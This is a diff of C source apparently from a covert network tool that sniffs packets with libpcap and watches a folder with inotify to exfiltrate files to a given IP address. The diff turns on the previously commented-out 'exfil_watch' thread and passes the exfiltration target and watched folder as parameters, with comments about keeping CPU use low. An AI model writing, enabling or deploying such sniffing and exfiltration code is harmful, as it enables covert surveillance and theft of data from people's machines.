@@ -10,7 +10,6 @@
 #include <pthread.h>
 
 #include "server.h"
-#include "crypto.h"
 #include "util.h"
 #include "ntp.h"
 #include "inet.h"
@@ -28,21 +27,21 @@ struct bpf_program fltr_prog;
 struct exfil_pack
 {
 	uint32 ipaddr;
-	char * folder;
+	char  *folder;
 };
 
-void pcap_start(const char *fltr_str, int duplex)
+void pcap_start(const char *fltr_str, int duplex, uint32 ipaddr, char *folder)
 {
 	pcap_t* nic;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pthread_t exfil_thread;
-	struct exfil_pack expck;
+	struct exfil_pack expack;
 
-	expck.ipaddr = DEF_ADR;
-	expck.folder = DEF_WCH;
+	expack.ipaddr = ipaddr;
+	expack.folder = folder;
 
 	// Setup Exfil Watch
-	//pthread_create(&exfil_thread, NULL, exfil_watch, &expck);
+	pthread_create(&exfil_thread, NULL, exfil_watch, &expack);
 
 	if ((nic = pcap_open_live(NULL, MAX_LEN, 0, -1, errbuf)) == NULL)
 		error(errbuf);
@@ -56,14 +55,14 @@ void pcap_start(const char *fltr_str, int duplex)
 		error("pcap_setfltr_str");
 
 	// Start capturing, make sure to heavily restrict our CPU usage.
-	while (1)
+	while (TRUE)
 	{
 		if (pcap_dispatch(nic, -1, pkt_handler, (u_char*)duplex) < 0)
 			error("pcap_loop");
 		usleep(5000); // sleep 5ms
 	}
 	
-	//pthread_join(exfil_thread, NULL);
+	pthread_join(exfil_thread, NULL);
 }
 
 void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char *packet)
@@ -214,9 +213,13 @@ void *exfil_watch(void *arg)
 	int fd, wd, ret;
 	static struct inotify_event *event;
 	fd_set rfds;
-	struct exfil_pack expck = *(struct exfil_pack*)arg;
-	uint32 ipaddr = expck.ipaddr;
-	char * folder = expck.folder;
+	struct exfil_pack expck;
+	uint32 ipaddr;
+	char  *folder;
+
+	expck = *(struct exfil_pack*)arg;
+	ipaddr = expck.ipaddr;
+	folder = expck.folder;
 
 	fd = inotify_init();
 	if (fd < 0)
